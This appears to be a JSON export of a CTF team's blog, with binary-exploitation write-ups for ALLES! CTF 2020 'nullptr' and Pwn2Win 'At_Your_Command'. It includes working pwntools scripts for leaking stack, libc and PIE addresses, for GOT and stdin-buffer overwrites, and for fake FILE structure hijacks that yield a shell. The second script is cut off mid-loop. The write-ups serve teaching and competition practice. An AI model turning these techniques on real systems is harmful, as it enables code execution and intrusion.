[{"authors":["admin"],"categories":null,"content":" Anis_Boss is a tunisian Cyber Security Consultant. he is graduated as Computer Science \u0026amp; Networks Engineer at @INSAT. He spends time digging stuffs like Bugs exploitation, Reverse engineering. He like playing hacking competitions (Capture The Flag contests) and he is part of the3000 team. KERRO is a tunisian Networking and Telecommunication engineering student @INSAT. he\u0026rsquo;s interested in cyber security generally and low level stuff specifically. He enjoys playing CTF competitions with the3000 team, reverse engineering and binary exploitation challenges mostly.  ","date":-62135596800,"expirydate":-62135596800,"kind":"taxonomy","lang":"en","lastmod":-62135596800,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"/authors/admin/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/authors/admin/","section":"authors","summary":"Anis_Boss is a tunisian Cyber Security Consultant. he is graduated as Computer Science \u0026amp; Networks Engineer at @INSAT. He spends time digging stuffs like Bugs exploitation, Reverse engineering. He like playing hacking competitions (Capture The Flag contests) and he is part of the3000 team.","tags":null,"title":"Kerro \u0026 Anis_Boss","type":"authors"},{"authors":[],"categories":[],"content":"Challenge Details    Event Challenge Category Link     ALLES! CTF 2020 nullptr PWN https://ctftime.org/event/1091    Description  Category:Binary Exploitation Difficulty:Medium/Hard Author:Flo First Blood:3k\nSolved By: 3k, RPISEC, DiceGang, RedRocket (4 solves)\nWelcome to the House Of I\u0026rsquo;m pretty sure this is not even a heap challenge.\nChallenge Files: nullptr.zip\nncat --ssl 7b000000455b22693d06c5a7.challenges.broker5.allesctf.net 1337   We participated in ALLES! CTF 2020 with the3000 team, and we ranked 8th at the end \\o/ !\nTL;DL   Leak stack pointer using logic bug in scanf format string.\n  Leak Libc and PIE addresses through arbitrary read using already given functionality.\n  Use arbitrary null pointer to overwrite **_IO_buf_base ** of stdin structure.\n  Get a shell \\o/.\n  As Detailed in the description of the challenge, the author provided the necessary files to run the binary as intended which include the binary, Dockerfile and source code file.\nReverse Engineering Static Analysis We were give the source code of the application which makes it easier for us to analyze it and a 64 bits executable not stripped and dynamically linked as shown below:\n$ file nullptr nullptr: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dc37e094d9cc17b7b9c50eeba3a7100d412954d3, for GNU/Linux 3.2.0, with debug_info, not stripped  Also we have an idea about the **Libc ** (libc 2.30) used since we have the Dockerfile which includes the ubuntu version used on the remote server.\nThe given binary has nearly full protection except Partial Relro as shown below:\n$ checksec ./nullptr [*] '/tmp/kek/nullptr' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled  Source Code analysis Let\u0026rsquo;s start with the main function:\nint main(void) { unsigned long addr; int menuchoice; while (1) { printf(\u0026quot;[1. view, 2. null, -1. exit]\u0026gt; \\n\u0026quot;); fflush(stdout); scanf(\u0026quot;%d\u0026quot;, \u0026amp;menuchoice); getc(stdin); switch (menuchoice) { case 1: printf(\u0026quot;view address\u0026gt; \\n\u0026quot;); fflush(stdout); scanf(\u0026quot;%lu\u0026quot;, \u0026amp;addr); getc(stdin); printf(\u0026quot;%p: %p\\n\u0026quot;, addr, *(void**)addr); break; case 2: printf(\u0026quot;nuke address\u0026gt; \\n\u0026quot;); fflush(stdout); scanf(\u0026quot;%lu\u0026quot;, \u0026amp;addr); getc(stdin); *(void**)addr = NULL; printf(\u0026quot;ok!\\n\u0026quot;); break; case -1: printf(\u0026quot;bye!\\n\u0026quot;); return 1; default:; } } return 0; }  the main subroutine introduces 3 choices as following:\n View address: Reads a long unsigned number using \u0026lsquo;%lu\u0026rsquo; format string of scanf and print out the address of addr variable alongside the content of the pointer supplied by the user which means the content of the pointer contained in addr variable. Nuke address : Reads a long unsigned number using \u0026lsquo;%lu\u0026rsquo; format string of scanf and overwrite the content of given address with null bytes (QWORD). exit: Print out a message then returns.  Besides the main function, the author was too generous to provide us with a win function which executes a \u0026lsquo;/bin/sh\u0026rsquo;\nvoid get_me_out_of_this_mess() { execl(\u0026quot;/bin/sh\u0026quot;, \u0026quot;sh\u0026quot;, NULL); }  Exploitation Leaking Stack address the binary has a logic bug, which can be abused by giving scanf a non-numeric input.\nif the conversion of the input to unsigned long fails, scanf will just free the used pointer and returns without modifying its second argument.\nif (flags \u0026amp; NUMBER_SIGNED) //Signed Number num.l = __strtol_internal(char_buffer_start (\u0026amp;charbuf), \u0026amp;tw, base, flags \u0026amp; GROUP); else //Unsigned Number (our case) num.ul = __strtoul_internal(char_buffer_start (\u0026amp;charbuf), \u0026amp;tw, base, flags \u0026amp; GROUP); } //check if the input was converted successfully else it calls conv_error() if (__glibc_unlikely (char_buffer_start (\u0026amp;charbuf) == tw)) conv_error (); //free the pointers and returns.  Trying this theory on the given binary reveals a stack leak.\n$ ./nullptr [1. view, 2. null, -1. exit]\u0026gt; 1 view address\u0026gt; a 0x7fffe7280ad0: 0x1 #Stack Leak \\o/ [1. view, 2. null, -1. exit]\u0026gt;  It\u0026rsquo;s time to start implementing the exploit.\nfrom pwn import * p = remote(\u0026quot;172.17.0.2\u0026quot;,1024) p.recvline() p.sendline(\u0026quot;1\u0026quot;) p.recvline() p.sendline(\u0026quot;a\u0026quot;) data = p.recvline().strip().split(\u0026quot;:\u0026quot;)[0] stack_leak = int(data,16) print hex(stack_leak)  Leaking Libc \u0026amp; PIE addresses Since we have a valid stack address and an arbitrary read, we can find an address on the stack that contains a PIE address and use View address to get its content. from that we can look for a Libc address in the binary.\nfrom pwn import * p = process(\u0026quot;ncat --ssl 7b000000455b22693d06c5a7.challenges.broker5.allesctf.net 1337\u0026quot;,shell=True) p.recvline() p.sendline(\u0026quot;1\u0026quot;) p.recvline() p.sendline(\u0026quot;a\u0026quot;) data = p.recvline().strip().split(\u0026quot;:\u0026quot;)[0] stack_leak = int(data,16) print hex(stack_leak) p.recvline() off1 = stack_leak + (0x108-(9*8)) #offset on the stack that contains PIE address. p.sendline(\u0026quot;1\u0026quot;) p.sendline(str(off1)) p.recvline() pie_leak = int(p.recvline().strip().split(\u0026quot;: \u0026quot;)[1],16) p.recvline() print hex(pie_leak) off2 = pie_leak + 0x2f78 #offset in the binary that contains libc address. bin_base = pie_leak - 0x10a0 win = bin_base + 0x1199 got = bin_base + 0x4000 print hex(bin_base) p.sendline(\u0026quot;1\u0026quot;) p.sendline(str(off2)) p.recvline() libc_leak = int(p.recvline().strip().split(\u0026quot;: \u0026quot;)[1],16) libc_base = libc_leak - 0x87490 print hex(libc_base)  Getting shell Since the binary is partial relro, our idea is to overwrite one of the GOT entries with the address of win function. But how can we do that with just a null byte overwrite? Let\u0026rsquo;s examine the following stdin structure :\ngdb-peda$ p stdin $1 = (FILE *) 0x7ffff7f95980 \u0026lt;_IO_2_1_stdin_\u0026gt; gdb-peda$ p _IO_2_1_stdin_ $2 = { file = { _flags = 0xfbad2288, _IO_read_ptr = 0x5555555596b0 \u0026quot;\u0026quot;, _IO_read_end = 0x5555555596b0 \u0026quot;\u0026quot;, _IO_read_base = 0x5555555596b0 \u0026quot;\u0026quot;, _IO_write_base = 0x5555555596b0 \u0026quot;\u0026quot;, _IO_write_ptr = 0x5555555596b0 \u0026quot;\u0026quot;, _IO_write_end = 0x5555555596b0 \u0026quot;\u0026quot;, _IO_buf_base = 0x5555555596b0 \u0026quot;\u0026quot;, _IO_buf_end = 0x555555559ab0 \u0026quot;\u0026quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = \u0026quot;\u0026quot;, _lock = 0x7ffff7f984d0 \u0026lt;_IO_stdfile_0_lock\u0026gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7ffff7f95a60 \u0026lt;_IO_wide_data_0\u0026gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0xffffffff, _unused2 = '\\000' \u0026lt;repeats 19 times\u0026gt; }, vtable = 0x7ffff7f974a0 \u0026lt;_IO_file_jumps\u0026gt; } gdb-peda$  when a scanf  is used, it stores the input in the _IO_read_base which is a heap chunk pointer and then gets updated with _IO_buf_base pointer.\nSo our idea is to partially null-overwrite the _IO_buf_base in order to point to GOT.plt section so the next scanf  call will store our input in that location.\nLet\u0026rsquo;s take a look at the memory mapping of our process:\ngdb-peda$ vmmap Start End Perm\tName 0x0000564c3b44e000 0x0000564c3b44f000 r--p\t/tmp/kek/nullptr 0x0000564c3b44f000 0x0000564c3b450000 r-xp\t/tmp/kek/nullptr 0x0000564c3b450000 0x0000564c3b451000 r--p\t/tmp/kek/nullptr 0x0000564c3b451000 0x0000564c3b452000 r--p\t/tmp/kek/nullptr 0x0000564c3b452000 0x0000564c3b453000 rw-p\t/tmp/kek/nullptr //GOT.plt 0x0000564c3befc000 0x0000564c3bf1d000 rw-p\t[heap] 0x00007efdc0dd0000 0x00007efdc0df5000 r--p\t/lib/x86_64-linux-gnu/libc-2.30.so 0x00007efdc0df5000 0x00007efdc0f3f000 r-xp\t/lib/x86_64-linux-gnu/libc-2.30.so 0x00007efdc0f3f000 0x00007efdc0f89000 r--p\t/lib/x86_64-linux-gnu/libc-2.30.so 0x00007efdc0f89000 0x00007efdc0f8c000 r--p\t/lib/x86_64-linux-gnu/libc-2.30.so 0x00007efdc0f8c000 0x00007efdc0f8f000 rw-p\t/lib/x86_64-linux-gnu/libc-2.30.so 0x00007efdc0f8f000 0x00007efdc0f95000 rw-p\tmapped 0x00007efdc0fc5000 0x00007efdc0fc6000 r--p\t/lib/x86_64-linux-gnu/ld-2.30.so 0x00007efdc0fc6000 0x00007efdc0fe4000 r-xp\t/lib/x86_64-linux-gnu/ld-2.30.so 0x00007efdc0fe4000 0x00007efdc0fec000 r--p\t/lib/x86_64-linux-gnu/ld-2.30.so 0x00007efdc0fed000 0x00007efdc0fee000 r--p\t/lib/x86_64-linux-gnu/ld-2.30.so 0x00007efdc0fee000 0x00007efdc0fef000 rw-p\t/lib/x86_64-linux-gnu/ld-2.30.so 0x00007efdc0fef000 0x00007efdc0ff0000 rw-p\tmapped 0x00007ffc42b91000 0x00007ffc42bb2000 rw-p\t[stack] 0x00007ffc42bef000 0x00007ffc42bf3000 r--p\t[vvar] 0x00007ffc42bf3000 0x00007ffc42bf5000 r-xp\t[vdso]  We noticed that the GOT \u0026amp; Heap pointers have only 3 different bytes, what if due to ASLR the last 3 bytes of GOT\u0026rsquo;s address are NULL, it will become 0x0000564c3b000000. In this case, we can partially overwrite the _IO_buf_base\u0026rsquo;s last 3 bytes with \\x00 it will point to binary\u0026rsquo;s GOT section. Therefore, the next scanf will read our input and store it into the GOT.\nSince our target is the base of the GOT section, the last 12 bits will always be zeros. So we have 12 bits affected by the ASLR to bruteforce. Our chance to pull this off is 2^12.\nFinal Exploit:\nfrom pwn import * while True: p = remote(\u0026quot;172.17.0.2\u0026quot;,1024) p.recvline() p.sendline(\u0026quot;1\u0026quot;) p.recvline() p.sendline(\u0026quot;a\u0026quot;) data = p.recvline().strip().split(\u0026quot;:\u0026quot;)[0] stack_leak = int(data,16) print hex(stack_leak) p.recvline() off1 = stack_leak + (0x108-(9*8)) p.sendline(\u0026quot;1\u0026quot;) p.sendline(str(off1)) p.recvline() pie_leak = int(p.recvline().strip().split(\u0026quot;: \u0026quot;)[1],16) p.recvline() print hex(pie_leak) off2 = pie_leak + 0x2f78 bin_base = pie_leak - 0x10a0 win = bin_base + 0x1199 got = bin_base + 0x4000 print hex(bin_base) if got \u0026amp; 0xfff000 == 0: p.sendline(\u0026quot;1\u0026quot;) p.sendline(str(off2)) p.recvline() libc_leak = int(p.recvline().strip().split(\u0026quot;: \u0026quot;)[1],16) libc_base = libc_leak - 0x87490 dl_runtime = libc_base + 0x20da30 print hex(libc_base) buf_base = libc_base + 0x1ea9b3 p.recv(8000) p.sendline(\u0026quot;1\u0026quot;) p.recvline() p.sendline(str(got)) addr1 = int(p.recvline().strip().split(\u0026quot;: \u0026quot;)[1],16) p.recvline() p.sendline(\u0026quot;1\u0026quot;) p.recvline() p.sendline(str(got+8)) addr2 = int(p.recvline().strip().split(\u0026quot;: \u0026quot;)[1],16) p.recvline() p.sendline(\u0026quot;2\u0026quot;) p.sendline(str(buf_base)) payload = \u0026quot;\u0026quot; payload += p64(addr1) payload += p64(addr2) payload += p64(dl_runtime) payload += p64(win) print \u0026quot;Getting shell \\o/\u0026quot; p.sendline(payload) p.interactive() p.close()  Our target is puts\u0026rsquo; GOT entry which is the fourth entry in the section, addr1,addr2  and dl_runtime are the first, second and third entries, mandatory for the binary to continue execution smoothly.\n$ python sploit.py [..] [+] Opening connection to 172.17.0.2 on port 1024: Done 0x7ffcdd46ca50 0x560459ffd0a0 0x560459ffc000 0x7f396bf9b000 Getting shell \\o/ [*] Switching to interactive mode nuke address\u0026gt; ok! [1. view, 2. null, -1. exit]\u0026gt; $ id uid=1000(ctf) gid=1000(ctf) groups=1000(ctf) $ cat flag CSCG¬TEST_FLAG} $  \\o/ !\n","date":1599491566,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1599491566,"objectID":"9abaa524094c48601d7d03367ee3f597","permalink":"/post/alles-ctf-2020-nullptr/","publishdate":"2020-09-07T16:12:46+01:00","relpermalink":"/post/alles-ctf-2020-nullptr/","section":"post","summary":"Challenge Details    Event Challenge Category Link     ALLES! CTF 2020 nullptr PWN https://ctftime.org/event/1091    Description  Category:Binary Exploitation Difficulty:Medium/Hard Author:Flo First Blood:3k","tags":[],"title":"ALLES! CTF 2020   Nullptr","type":"post"},{"authors":[],"categories":[],"content":"Challenge Details    Event Challenge Category Link     Pwn2Win At_Your_Command PWN https://ctftime.org/event/961    Description  Through reverse engineering work on Pixel 6, we identified the ButcherCorp server responsible for programming the RBSes. Our exploration team was only able to have limited access to this machine and extract the binaries from the programming service. As it runs with high privilege, exploiting it will allow us to extract more data from that server. Those data will bring us closer to the discovery of the person responsible for the Rebellion. Can you help us with this task?\nServer: nc command.pwn2.win 1337\n Link\n Mirror\nID: at_your_command\nScore: 267\nSolves: 26\nnc command.pwn2.win 1337   TL;DL   Leak Libc address through unsorted bin chunks by partial overwrite.\n  Construct a fake file structure in a controlled area (concatenation of 2 chunks).\n  Overwrite File pointer using format string bug.\n  Get shell through calling fclose() \\o/ !\nPwn2Win was a rough CTF competition, we were able only to solve one PWN challenge which took us nearly 6 hours to be the 4th team who solved it with our teammate Aracna.\n  Reverse Engineering First of all, starting with static analysis the given binary has nearly full protection as show below:\n$ checksec ./command CANARY : ENABLED FORTIFY : disabled NX : ENABLED PIE : ENABLED RELRO : FULL  As always, let\u0026rsquo;s start with just running the binary blindly and check the implemented functionalities through playing with different inputs.\n$ ./command Welcome to the command system ============================= Your name: test_name Welcome test_name Choose an option: 1. Include command 2. Review command 3. Delete command 4. List commands 5. Send commands \u0026gt; 1 Priority: aa Command: bbb The command has been included at index 0 Choose an option: 1. Include command 2. Review command 3. Delete command 4. List commands 5. Send commands \u0026gt; 2 Command index: 0 Priority: 0 Command: bbb Choose an option: 1. Include command 2. Review command 3. Delete command 4. List commands 5. Send commands \u0026gt; 4 Index 0 Priority: 0 Command: bbb Choose an option: 1. Include command 2. Review command 3. Delete command 4. List commands 5. Send commands \u0026gt; 3 Command index: 0 The command has been successfully deleted Choose an option: 1. Include command 2. Review command 3. Delete command 4. List commands 5. Send commands \u0026gt; 5 Sending commands... Are you sending the commands to which rbs? aa You command Mr. test_name!  the binary after reading a name it looks like it has the following commands:\n Include command : It takes 2 inputs a priority and a text command and stores them somewhere. Review command: Display the provided details of an included command via an index. Delete command: Delete an included command via an index. List commands: List all the included commands Send commands: It asks for an input then exit after printing the provided name in the first step.  Let\u0026rsquo;s fire up IDA and start analyzing the functions.\nmain function __int64 __fastcall main(__int64 a1, char **a2, char **a3) { time_t v3; // rax FILE *stream; // [rsp+0h] [rbp-70h] ssize_t v6; // [rsp+8h] [rbp-68h] char s; // [rsp+10h] [rbp-60h] unsigned __int64 v8; // [rsp+68h] [rbp-8h] v8 = __readfsqword(0x28u); init_chall(); welcome_message(); printf(\u0026quot;Your name: \u0026quot;, a2); v6 = read(0, buf, 0xCuLL); if ( v6 \u0026amp;\u0026amp; buf[v6 - 1] == 10 ) buf[v6 - 1] = 0; printf(\u0026quot;Welcome %s\\n\u0026quot;, buf); memset(\u0026amp;s, 0, 0x50uLL); manage_commands((__int64)\u0026amp;s); puts(\u0026amp;byte_15FA); puts(\u0026quot;Sending commands...\u0026quot;); v3 = time(0LL); snprintf(filename, 0x2DuLL, \u0026quot;/commands/%ld\u0026quot;, v3); stream = fopen(filename, \u0026quot;w\u0026quot;); if ( !stream ) { printf(\u0026quot;[ERROR] An error happened while opening the file\u0026quot;); exit(2); } send_command((__int64)\u0026amp;s, \u0026amp;stream); fclose(stream); return 0LL; }  the binary is stripped so we had to rename the functions as shown in the pseudo-code above. The binary just run in the following execution flow.\n init_chall() : It just disables buffering and sets alarm after 60 seconds. welcome_message() : it displays a hello message. It reads a name from stdin then prints Welcome Your_Name. manage_commands(): it manages the commands as explained before (include, review, \u0026hellip;). send_command(): it logs all the commands provided into a file.  Let\u0026rsquo;s dive into manage_commands function since the main functionalities are implemented in it.\n__int64 __fastcall manage_commands(__int64 a1) { __int64 result; // rax while ( 1 ) { menu(); //it prints the menu described before. result = (unsigned int)read_long_int(); // it reads 8 bytes long switch ( result ) { case 1LL: include_command(a1); break; case 2LL: review_command(a1); break; case 3LL: delete_command(a1); break; case 4LL: list_commands(a1); break; case 5LL: return result; default: error(); return result; } } }  After renaming the functions, this subroutine is handling the following functions depending on user input:\nInclude_command function int __fastcall include_command(__int64 a1) { int i; // [rsp+14h] [rbp-1Ch] ssize_t v3; // [rsp+18h] [rbp-18h] for ( i = 0; ; ++i ) { if ( i \u0026gt; 9 ) return puts(\u0026quot;[INFO] The authorized limit has been reached!\u0026quot;); if ( !*(_QWORD *)(8LL * i + a1) ) break; } *(_QWORD *)(8LL * i + a1) = malloc(0x188uLL); printf(\u0026quot;Priority: \u0026quot;); **(_QWORD **)(8LL * i + a1) = (int)read_long_int(); printf(\u0026quot;Command: \u0026quot;); v3 = read(0, (void *)(*(_QWORD *)(8LL * i + a1) + 8LL), 0x170uLL); if ( v3 ) { if ( *(_BYTE *)(*(_QWORD *)(8LL * i + a1) + v3 - 1 + 8) == 10 ) *(_BYTE *)(*(_QWORD *)(8LL * i + a1) + v3 - 1 + 8) = 0; } return printf(\u0026quot;The command has been included at index %d\\n\u0026quot;, (unsigned int)i); }  First, the function checks if the user has already supplied 10 commands which is the maximum number of allowed inputs at the same time. Then it allocates 0x188 chunk through malloc function and it reads 4 bytes input followed by a command string finally stores them in the parameter array a1 which is a commands array.\nCommand is a structure designed as follow:\nstruct commands{ long long priority; char command[0x170]; }  Review_command function __int64 __fastcall review_command(__int64 a1) { __int64 result; // rax int v2; // [rsp+1Ch] [rbp-4h] printf(\u0026quot;Command index: \u0026quot;); result = read_long_int(); v2 = result; if ( (int)result \u0026gt;= 0 \u0026amp;\u0026amp; (int)result \u0026lt;= 9 ) { result = *(_QWORD *)(8LL * (int)result + a1); if ( result ) { puts(\u0026amp;byte_15FA); result = display_command(*(_QWORD *)(8LL * v2 + a1)); } } return result; }  The function reads an index from the user then it checks if the index given points to an allocated command structure in order to prevent Use After Free. If it\u0026rsquo;s the case it displays the priority along side with the command string.\nDelete_command function int __fastcall delete_command(__int64 a1) { __int64 v1; // rax int v3; // [rsp+1Ch] [rbp-4h] printf(\u0026quot;Command index: \u0026quot;); LODWORD(v1) = read_long_int(); v3 = v1; if ( (int)v1 \u0026gt;= 0 \u0026amp;\u0026amp; (int)v1 \u0026lt;= 9 ) { v1 = *(_QWORD *)(8LL * (int)v1 + a1); if ( v1 ) { free(*(void **)(8LL * v3 + a1)); *(_QWORD *)(8LL * v3 + a1) = 0LL; LODWORD(v1) = puts(\u0026quot;The command has been successfully deleted\u0026quot;); } } return v1; }  The function reads an index from the user, it checks if the index given points to a valid command structure. If it\u0026rsquo;s the case it will free the correspondent chunk and null the pointer in a1 array in order to prevent the Double Free.\nList_command function __int64 __fastcall list_commands(__int64 a1) { __int64 result; // rax int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; i \u0026lt;= 9; ++i ) { result = *(_QWORD *)(8LL * i + a1); if ( result ) { puts(\u0026amp;byte_15FA); printf(\u0026quot;Index %d\\n\u0026quot;, (unsigned int)i); result = display_command(*(_QWORD *)(8LL * i + a1)); } } return result; }  the function just iterates over a1 array and displays the different allocated commands.\nthe 5th choice just returns to the main function.\nAfter the function manage_commands returns, it creates a file then it executes the send_commands function.\nunsigned __int64 __fastcall send_command(__int64 a1, FILE **a2) { int i; // [rsp+14h] [rbp-3Ch] __int64 v4; // [rsp+18h] [rbp-38h] char src; // [rsp+20h] [rbp-30h] char s; // [rsp+30h] [rbp-20h] unsigned __int64 v7; // [rsp+48h] [rbp-8h] v7 = __readfsqword(0x28u); memset(\u0026amp;s, 0, 0x14uLL); memset(\u0026amp;src, 0, 0x10uLL); puts(\u0026quot;Are you sending the commands to which rbs?\u0026quot;); v4 = (int)read_long_int(); fprintf(*a2, \u0026quot;Id: %lld\\n\u0026quot;, v4); for ( i = 0; i \u0026lt;= 9; ++i ) { if ( *(_QWORD *)(8LL * i + a1) ) fprintf(*a2, \u0026quot;%lld:%s\\n\u0026quot;, **(_QWORD **)(8LL * i + a1), *(_QWORD *)(8LL * i + a1) + 8LL); } snprintf(\u0026amp;src, 0xCuLL, buf); strcpy(\u0026amp;s, \u0026quot;Mr. \u0026quot;); strcat(\u0026amp;s, \u0026amp;src); printf(\u0026quot;You command %s!\\n\u0026quot;, \u0026amp;s); return __readfsqword(0x28u) ^ v7; }  The function reads a 4 bytes long long and then just stores the different commands into the opened file. After that, it calls snprintf without the format parameter which leads to a format string vulnerability but with a very limited number of chars 0xC. since we control the parameter buf which the name supplied in the first step.\nThen it concatenates the name with the string \u0026ldquo;Mr. \u0026quot; and prints the final message to the stdout.\nFinally, it returns to the main function and calls fclose() before exiting.\nExploitation We start by implementing the wrappers needed to communicate with the binary.\nfrom pwn import * from pwn import log as Log from time import sleep def log(title,value): Log.info(title + \u0026quot;: {} \u0026quot;.format(hex(value))) period = 0.2 def include(priority,command): p.sendline(\u0026quot;1\u0026quot;) p.recv(8000) p.sendline(str(priority)) p.recv(8000) p.send(command) sleep(period) p.recv(8000) def review(index): p.sendline(\u0026quot;2\u0026quot;) p.recv(8000) p.sendline(str(index)) p.recvuntil(\u0026quot;Command: \u0026quot;) data = p.recvline().strip() p.recv(8000) return data def delete(index): p.sendline(\u0026quot;3\u0026quot;) p.recv(8000) p.sendline(str(index)) p.recv(8000) def init(name): p.sendline(name) p.recv(8000)  Leaking Libc address Since it allocates 0x188 bytes, which is lower then 0x408, which is the maximum size that a tcache bin can hold. because of that the first 7 freed chunks will go to tcache bin and the next one will go to the unsorted bin and since the unsorted bin is a doubly linked list we can leak BK pointer if we can provide and empty command string through the following steps.\n  Allocates a chunk\nfirst state of the chunk\n  Freed chunk\nThe state of the freed chunk that goes to unsorted bin\n  Reallocated chunk\nwhen we reallocate the freed chunk that is stored in the unsorted bin, if we can provide an empty input as a command string as shown in the 3rd diagram we can persist the state of BK pointer in the same place as command string and it can be displayed through review_command function ==\u0026gt; Libc Leak \\o/ !\np=process(\u0026quot;./command\u0026quot;) p.recv(8000) payload = \u0026quot;\u0026quot; payload += \u0026quot;RANDOM_NAME\u0026quot; init(payload) #allocates 9 chunks (7 tcache + 1 in order to prevent consolidating with top chunk + 1 to unsorted bin) for i in range(9): include(123,\u0026quot;abc\u0026quot;) #frees 8 chunks ( 7 tcache + 1 unsorted) for i in range(8): delete(i) # allocates 7 chunks to empty tcache since it has the allocation priority for i in range(7): include(123,chr(65+i)*3) #this chunk allocated from unsorted bin include(123,\u0026quot;a\u0026quot;) #Will be explained below data = review(7) leak = u64(data.ljust(8,\u0026quot;\\x00\u0026quot;)) leak = leak \u0026amp; 0xffffffffffffff00 leak = leak | 0xa0 log(\u0026quot;leak\u0026quot;,leak)  Since we couldn\u0026rsquo;t send an empty string to the binary as command text we decided to make one byte overwrite on the BK pointer and because the LSB of the main arena stored is always 0xa0 for the challenge\u0026rsquo;s libc provided (2.27)\n$ python solver.py [+] Starting local process './command': pid 24613 [*] leak: 0x7fb4a343aca0 [*] Switching to interactive mode $    Getting Shell In the send_command function after opening the file for writing the different commands provided, it calls snprintf with a format string vulnerability with the provided name as a parameter.\n0x557573c5134d: mov esi,0xc 0x557573c51352: mov rdi,rax 0x557573c51355: mov eax,0x0 =\u0026gt; 0x557573c5135a: call 0x557573c50a70 \u0026lt;snprintf@plt\u0026gt; 0x557573c5135f: lea rax,[rbp-0x20] 0x557573c51363: mov DWORD PTR [rax],0x202e724d 0x557573c51369: mov BYTE PTR [rax+0x4],0x0 0x557573c5136d: lea rdx,[rbp-0x30] Guessed arguments: arg[0]: 0x7ffd4bcac690 --\u0026gt; 0x0 arg[1]: 0xc ('\\x0c') arg[2]: 0x557573e52060 (\u0026quot;YOUR_NAME\u0026quot;) [------------------------------------stack-------------------------------------] 0000| 0x7ffd4bcac670 --\u0026gt; 0x7ffd4bcac6d0 --\u0026gt; 0x557574364200 --\u0026gt; 0xfbad2c84 0008| 0x7ffd4bcac678 --\u0026gt; 0x7ffd4bcac6e0 --\u0026gt; 0x557574363260 --\u0026gt; 0x7b ('{') 0016| 0x7ffd4bcac680 --\u0026gt; 0xa73e52080 0024| 0x7ffd4bcac688 --\u0026gt; 0x0 0032| 0x7ffd4bcac690 --\u0026gt; 0x0 0040| 0x7ffd4bcac698 --\u0026gt; 0x0 0048| 0x7ffd4bcac6a0 --\u0026gt; 0x0 0056| 0x7ffd4bcac6a8 --\u0026gt; 0x0  As shown in the gdb context above, the top of the stack contains a pointer on the _IO_FILE_plus structure for the opened file.\nSo the idea is, if we manage to overwrite that pointer in order to point to our fake file structure. This will allow us to hijack the vtable pointer. From there we can redirect the code execution when the binary calls fclose() and since the snprintf juste use 12 bytes only as length, this make it harder for us to full control the pointer on the stack.\nTo bypass this limitation, since the structure is located at the heap we need only to partially overwrite the pointer to make it point to our controlled data.\nFake File Structure The provided libc version is higher then 2.23 which make the assertion of the vtable pointer inside _libc_IO_vtables section. the default File structure is as the following (stderr example) :\n$2 = { file = { _flags = 0xfbad2087, _IO_read_ptr = 0x7f9470711703 \u0026lt;_IO_2_1_stderr_+131\u0026gt; \u0026quot;\u0026quot;, _IO_read_end = 0x7f9470711703 \u0026lt;_IO_2_1_stderr_+131\u0026gt; \u0026quot;\u0026quot;, _IO_read_base = 0x7f9470711703 \u0026lt;_IO_2_1_stderr_+131\u0026gt; \u0026quot;\u0026quot;, _IO_write_base = 0x7f9470711703 \u0026lt;_IO_2_1_stderr_+131\u0026gt; \u0026quot;\u0026quot;, _IO_write_ptr = 0x7f9470711703 \u0026lt;_IO_2_1_stderr_+131\u0026gt; \u0026quot;\u0026quot;, _IO_write_end = 0x7f9470711703 \u0026lt;_IO_2_1_stderr_+131\u0026gt; \u0026quot;\u0026quot;, _IO_buf_base = 0x7f9470711703 \u0026lt;_IO_2_1_stderr_+131\u0026gt; \u0026quot;\u0026quot;, _IO_buf_end = 0x7f9470711704 \u0026lt;_IO_2_1_stderr_+132\u0026gt; \u0026quot;\u0026quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7f9470711760 \u0026lt;_IO_2_1_stdout_\u0026gt;, _fileno = 0x2, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = \u0026quot;\u0026quot;, _lock = 0x7f94707128b0 \u0026lt;_IO_stdfile_2_lock\u0026gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7f9470710780 \u0026lt;_IO_wide_data_2\u0026gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = '\\000' \u0026lt;repeats 19 times\u0026gt; }, vtable = 0x7f947070d2a0 \u0026lt;_IO_file_jumps\u0026gt; }  our goal is to construct a similar structure inside the heap and overwrite the file pointer to point to our Fake file. In that way when calling fclose() the program will call our controlled vtable address.\nWe shall overwrite the vtable in such a manner so that instead of calling the regular FILE associated function, _IO_str_overflow would be called. Since we can already forge file pointer, we can control the execution flow with one_gadget call.\nFor deep diving into File Structure Exploitation, here is a useful link that describes well the exploitation process.\nIf we manage to overwrite by one byte the pointer located into the stack, we fall into our controlled data but due to size limitation we can\u0026rsquo;t fully write our fake file structure which has size 192 without overflowing the next chunk (Default File chunk) which is not the case (no overflow for us). so we don\u0026rsquo;t have choices but overwriting two bytes with null byte. but this will just make the pointer points to the area before the heap which we don\u0026rsquo;t control :( !\nwe came up with a clever workaround by just making 10 allocations to make the heap size higher then 0x1000 and by any chance (brute force FTW) if the heap base just ends with 0x#f000 then when nulling the last two bytes of the pointer we fall into 2 controlled chunks (# : any random byte) because of the default File pointer ends with 0x*0200. ( * = # + 1 )\nSo final idea is to divide the fake File structure between two controlled chunks and taking consideration of the 2nd chunk metadata.\nfake1=\u0026quot;\u0026quot; fake1+=p64(0xfbad2400) #flags fake1+=p64(0)*8 fake1+=p64(0)*2 fake2=p64(_IO_lock)*3 #to avoide siegsegv fake2+=p64(0xffffffffffffffff) fake2+=p64(0) fake2+=p64(0) fake2+=p64(0)*6 fake2+=p64(str_overflow-136) #points to str_overflow fake2+=p64(one_gadget) #(char *) (*((_IO_strfile *) fp)-\u0026gt;_s._allocate_buffer) (new_size); for i in range(10): delete(i) for i in range(8): 